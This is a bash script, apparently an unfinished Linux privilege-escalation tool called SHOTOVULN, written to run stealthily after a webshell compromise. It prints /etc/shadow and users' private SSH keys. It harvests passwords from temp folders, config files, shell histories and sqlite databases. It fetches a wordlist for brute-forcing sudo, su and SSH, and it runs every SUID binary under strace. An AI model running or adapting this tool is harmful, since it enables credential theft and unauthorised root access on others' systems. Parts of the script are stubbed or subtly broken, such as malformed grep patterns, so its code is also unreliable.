#!/bin/bash

echo "SHOTOVULN v0.2        *0* Senseiiii show me the path to R00t *o* "
# insert ASCII art =)
echo "";
echo "Usage: $0 [currentpassword] [brute] [dwl]";
echo "Vulnerabilities will be outputed under each [x] test";

# PHILOSOPHY for devs
# - non interactive
# - stealth , try not to touch drive except if needed, try to run everything in memory as much as possible
# - do not output useless information, only valid vuln or nothing
# - run as low privilege user
# - show clear path to root
# - no colors , can be used outside of standard terminals (webshells)
# - output to file for better read
# - try to document the vuln in comment (ie CVE-xxx CWE)
# requirement on the compromised box : *nix OS, bash [+ python , pip : for brute]
# typical usage, you get a webshell and you want to elevate

#main TODO make all ideas already present in comments work and finalize it v1.0
# TODO need to check if "find" is the best cmd to check permissions


echo "### 0. Pre work";

brute=false;
dwl=false;
declare -a passfound;

# if root exit
if [ "$2" == "brute" ] ; then brute=true; echo "brute mode"; fi
if [ "$3" == "dwl" ] ; then dwl=true; echo "download allowed"; fi

echo "[o] Saving writable folders for everyone, useful for next steps";
writabledirs=$(find / -type d -perm /o+w ! -path "*mqueue*" 2>/dev/null);
writedir=$(echo "$writabledirs" | head -n1);
echo "[o] Will use as writable dir: $writedir";

currentuser=$(id);
echo "[o] Current user and privileges is: $currentuser";
echo "[o] Getting quality short password wordlist from internet...";

if [ $dwl == true ]; then
 if [ ! -f "$writedir/.wordlist" ]; then
 wget -qO "$writedir/.wordlist" "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top220-probable.txt"; # 200 to be fast
 fi;
fi;


echo "[o] Getting valid users for login";
validusers=$(grep -v '/false' /etc/passwd | grep -v '/nologin' | cut -d ':' -f1);

if [ $brute == true ]; then
 passwords="$writedir/.wordlist";
 # python and pip needed on the box TODO test here
 if ( which python );  then pip install pexpect; pythonandpip=true; fi;
fi;


echo "";
echo "### 1. Auditing features-like paths to go to other privileges"
# sudo and su brute https://www.altsci.com/concepts/sudo-and-su-considered-harmful-sudosu-bruteforce-utility
if [ ! -z "$1" ] ; then
echo " ! Own / currentuser password provided ! ";
echo "[x] Checking what you can do with sudo with this password, ie. going to root"; # example no CVE feature
sudo -l;
else
# if brute=true ; then
echo "[x] Now bruteforcing the loggedin user password through python script"; # example CWE weak password
# TODO faster sudo bruteforcer , using python child / pexpect
# python tools/sudo_brute1.py < "$passwords" ; # here use a better script or smaller wordlist
fi;

# if brute == true ; then ; fi
echo "[x] Brute forcing local users via su"; # example CWE weak password
# python

echo "Now auditing SSH..."
echo "[x] Getting SSH permissions";
sshperm=$(grep -niR --color permit /etc/ssh/sshd_config);
echo "[debug] : $sshperm";

echo "[x] Getting allow users (if any) in SSH config"
sshusers=$(grep -niR --color allowusers /etc/ssh/sshd_config);
echo "[debug]: $sshusers";

echo "[x] Checking port used in SSH config";
sshport=$(grep Port /etc/ssh/sshd_config | cut -d ' ' -f2);

echo "[x] Now bruting valid users on SSH ports using ssh passcript"; # example CWE weak password
# ./tools/getsshpass-0.8.sh "$passwords";
# else exit;

# TODO check if dmesg allows you to privesc echo "Do we have access to dmesg and check privesc related information ?"
#dmesg script;





echo "";
echo "### 2. Auditing file and folders permissions for privesc"

echo "[x] Simply cating /etc/shadow and /etc/shadow derivatives, ie. might be lucky"; #CWE weak file folder permissions
cat /etc/shadow 2>/dev/null;
cat /etc/shadow.old 2>/dev/null;
cat /etc/shadow.bak 2>/dev/null;

echo "[x] Checking readable private RSA keys in home folders, ie. wrong RSA key permissions"; #CWE weak file folder permissions
for user in $validusers; do cat "/home/$user/.ssh/id_rsa" 2>/dev/null; done
# extend filename

echo "[x] Root owned files in non root owned directory, ie. other can replace root owned files"; #example CVE-xxx nginx package vuln
for x in $(find /var -type f -user root 2>/dev/null -exec dirname {} + | sort -u); do (echo -n "$x is owned by " && stat -c %U "$x") | grep -v 'root'; done

echo "[x] Writable directory in default PATH, ie. other can tamper PATH of scripts which run automatically"; #example CVE-xxx
pathstotest=$(echo "$PATH" | tr ':' '\n');
for path in $pathstotest; do find "$path" 2>/dev/null -type d -perm /o+w -exec ls -alhd {} +; done

echo "[x] Checking usual temporary folder for passwords or secrets and storing them, i.e. other can use the password to elevate or test password reuse"; # example CVE-xxx CWE info disclosure
find /tmp/  2>/dev/null -type f -size +0 -exec grep -i 'secret/|password/|' {} +;
find /dev/shm  2>/dev/null -type f -size +0 -exec grep -i 'secret/|password/|' {} +;
# TODO hash find in this content

echo "[x] Checking crontab script protection, ie. other can write to crontab scripts" #example CVE-xxx
for user in $validusers; do
writablescripts=$(grep --color "$user" /etc/crontab | cut -f4 | cut -d ' ' -f1 | sort -u);
for script in $writablescripts; do find $(which "$script") 2>/dev/null -perm /o+w -exec ls -alh {} +; find "$script" 2>/dev/null -perm /o+w -exec ls -alh {} +; done;
done






echo "";
echo "### 3. Auditing SUID and SUID operations without arguments provided"
# TODO be careful not to kill network with SUID 
### https://www.pentestpartners.com/blog/exploiting-suid-executables/;
echo "[x] SGID folders writable by others, ie. other can get group rights by writing to it"
find / -type d -perm /g+s -perm /o+w -exec ls -alhd {} + 2>/dev/null;
echo "SUID folders writable by others, ie. other can get user rights by writing to it"
find / -type d -perm /u+s -perm /o+w -exec ls -alhd {} + 2>/dev/null;
# TODO echo "Test SUID conf files for error based info disclosure"
# TODO code it --conf / -c / grep conf in help
# example ./suidbinary -conf /etc/shadow outputs the user hashes
echo "Generating SUID logs ... you might receive some pop ups and error message since we are starting all SUID binaries.";
mkdir -p "$writedir/.shotologs";

find / -perm /4000 2>/dev/null | sort -u > "$writedir/.suidbinaries";
while read -r suid; do
echo "[debug $suid]";
basename=$(basename "$suid");
#sleep 6s;
# TODO bugfix here the script stops at the middle of the list
timeout 13s strace "$suid" 2>"$writedir"/.shotologs/"$basename".stracelog 1>/dev/null ;
done < "$writedir/.suidbinaries";

# add this generic vuln , SUID root loading from writable dir :/
# https://www.exploit-db.com/exploits/41907/
echo "[x] Relative path opening in SUID binaries, ie. other can fool the SUID binary to open arbitrary file." #example CVE-xxx
grep -n 'open("\.' "$writedir"/.shotologs/* --color;
grep -n 'open(' "$writedir"/.shotologs/* | grep -v 'open("/';
echo "[x] Environment variables used in suid binaries, ie. other can inject into env, untrusted use of env variables." #example CVE-xxx
grep -n --color "getenv(" "$writedir"/.shotologs/*;
echo "[x] Exec used in SUID binaries, ie. other can fool SUID use of PATH, untrusted use of PATH." #example CVE-xxx
grep -n --color 'execve(\.' "$writedir"/.shotologs/*;






echo "";
echo "### 4. Specific edge cases which enable you to change privilege"
echo "[x] Apache symlink test, ie. allows other to check files and folders of other users using the shared apache account"; #example no CVE but feature
find / -name "apache*.conf" -exec echo {} + -exec grep -i symlink --color {} + 2>/dev/null;
echo "[x] Pythonpath variable issues, ie. if PATH is vulnerable and a python privilege script runs, other can inject into its PATH"; # example CVE-xxx
pythonpath=$(python -c "import sys; print '\n'.join(sys.path);")
for path in $pythonpath; do find "$path" 2>/dev/null -type d -perm /o+w -exec ls -alhd {} +; done






echo "";
echo "### 5. Init.d scripts auditing";
### The problem is service (init.d) strips all environment variables but TERM, PATH and LANG which is a good thing
echo "[x] RC scripts pointing to vulnerable directory, ie. other can write to it and get root privilege"; # example CVE-xxx
#grep -n --color '/' /etc/rc.local;
echo "[x] Init.d scripts using unfiltered environment variables, ie. user can inject into it and get privilege";
grep -n -R -v 'PATH=\|LANG=\|TERM=' /etc/init.d/* | grep "PATH\|LANG\|TERM";
# TODO confirm this is exploitable , better regexp , remove commented line
# race PATH inject before init.d is starting
# init.d is starting early
echo "[x] Usage of predictable or fixed files in a writable folder used by init.d, ie. other can race and symlink file creation"; # example CVE-xxx
# TODO list all path used by init, filter writable ones
usedbyinit="$(grep -n -R --color ' /tmp' /etc/init.d/* | sort -u)";
# regex select only path
# TODO crosscheck with writabledirs





echo "";
echo -e "### 6. Conf files password disclosure and password reuse";
echo "[x] Checking readable passwords used in .conf files, ie. other can read and use then or try password reuse";
find / 2>/dev/null -name "*.conf"  -exec grep -n -i "password =\|password=\|password :\|password:" {} +;
# TODO filter false positives, filter comments





echo "";
echo "### 7. Log file information disclosure";
echo "[x] Checking history files and harvesting info, ie. other can read password and try password reuse"; # example CWE file folder permission
find / 2>/dev/null -name "*history"  -exec grep -n -i "--password\|--pass\|-pass\|-p" {} +;
# $validusers history grepping


echo "";
echo "### 8. Database file information disclosure";
echo "[x] Checking passwords inside local databases file"
find / 2>/dev/null -name "*.sqlite" -readable -exec grep -i 'pass' {} +;



echo "";
echo -e "$ORANGE### X. Privesc matrix $NOCOLOR";
# we might need to create a matrix of user privs
# user1 > user2 > user9 > group1 > rootgroup > root
# BIG TODO , map the privilege , ie like user1 > user2 > user3 > root
# privescpath=(user1,user2);(user2,root)
